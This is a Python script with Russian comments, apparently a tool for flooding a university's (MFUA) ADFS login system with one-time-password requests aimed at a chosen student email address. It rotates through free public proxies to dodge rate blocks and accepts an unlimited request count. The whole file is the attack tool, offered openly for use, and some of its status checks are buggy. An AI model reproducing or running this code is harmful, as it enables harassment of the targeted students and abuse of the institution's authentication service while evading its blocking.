"""
                    ✨ MFUA_splash.py ✨

                    📦 Почта для обратной связи: mfua.crack@gmail.com
                    🎃 Лицензия: MIT license
                    ☕ Поддержать Автора: https://www.donationalerts.com/r/tot_camyi_coder
"""

# # # #
import requests
import time
# # # #


class MFUA_ssp:
    def __init__(self):
        self.session = None

    def get_proxy(self):
        print(f'[get_proxy] - Получение прокси...')
        r= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text.splitlines()
        print(f'[get_proxy] - Прокси получены!')
        return r

    def free_proxy(self):
        proxy_list = self.get_proxy()
        print(f'[proxy_check] - Поиск прокси...')
        for i in range(3):
            for ip in proxy_list:
                _make = {
                    "http": 'http://'+ip,
                    "https": 'http://'+ip
                }
                s = requests.Session()
                s.proxies.update(_make)
                try:
                    r = s.get('https://sts.mfua.ru/adfs/ls/', timeout=0.75)
                    if r.status_code == 200 or 301 or 302:
                        print(f'[proxy_check] - Используется прокси: {ip}')
                        self.session = s
                        return _make
                    elif r.status_code == 403 or 423:
                        print(f'[proxy_check] - Прокси {ip} ЗАБЛОКИРОВАН')
                    else:
                        #print(f'[proxy_check] - Прокси {ip} выдал ошибку: {r.status_code}')
                        pass
                except requests.exceptions.ProxyError:
                    #print(f'[proxy_check] - Прокси {ip} выдал ошибку прокси')
                    pass
                except requests.exceptions.Timeout:
                    #print(f'[proxy_check] - Прокси {ip} не отвечает')
                    pass
                except Exception as err:
                    #print(f'[proxy_check] - Прокси {ip} выдал ошибку: {err}')
                    pass
        print('[proxy_check] - Не удалось найти рабочие прокси :/')
        print('[proxy_check] - Запуск без прокси...')
        print("Для отмены нажмите 'Ctrl + C' или 'Ctrl + Z'")
        time.sleep(5)
        return {}
    def _session(self):
        if self.session is None:
            s = requests.Session()
            s.proxies.update(self.free_proxy())
            return s
        else:
            return self.session

    def _get_SAMLRequest(self, mail):
        _mail = str( mail ).split("@")[0]
        url = f'https://portal.mfua.ru/adfs/?AUTH_FORM=Y&TYPE=AUTH&user_name={_mail}@s.mfua.ru&USER_LOGIN={_mail}&domen=@s.mfua.ru'
        body = f'AuthMethod=MFUA+One-time+passwords&UserName={_mail}@s.mfua.ru'
        s = self._session() if use_proxy else requests.Session()
        print(f'[SAMLRequest] - Получение SAMLRequest...')
        try:
            resp = s.get(url, data=body)
            print(f'[SAMLRequest] - Получен')
            return resp.url, body
        except Exception as err:
            print(f'[SAMLRequest] - ошибка: {err}')

    def _work(self, mail, amount, use_proxy):
        print(f'[_work] - Запуск потока')
        saml, body = self._get_SAMLRequest(mail)
        s = self._session() if use_proxy else requests.Session()
        for i in range(amount):
            try:
                r = s.post(url=saml, data=body)
                mail = mail if "@" in mail else mail+"@s.mfua.ru"
                if r.status_code == 200:
                    if "Превышено" in r.text:
                        print(f'[{mail}] - Превышено количество запросов.')
                        break
                    print(f'[{mail}] - отправлено')
                else:
                    print(f'[{mail}] - {r.status_code}')
            except:
                print(f'[{mail}] - ошибка')
        print(f'[_work] - Поток завершён')


if __name__ == "__main__":
    """
        Почта: 12345678@s.mfua.ru или 12345678
        Количество запросов: от 1 до ∞
    """
    print("Добро пожаловать в MFUA_spp")
    print("Введите почту: (пример 12345678@s.mfua.ru)")
    mail = input(">> ")
    print("Введите количество запросов: ")
    amount = int( input(">> ") )
    print("Вы хотите использовать прокси? (Y/n)")
    use_proxy = input(">> ").lower()
    use_proxy = False if use_proxy == "n" else True
    MFUA_ssp()._work(mail, amount, use_proxy)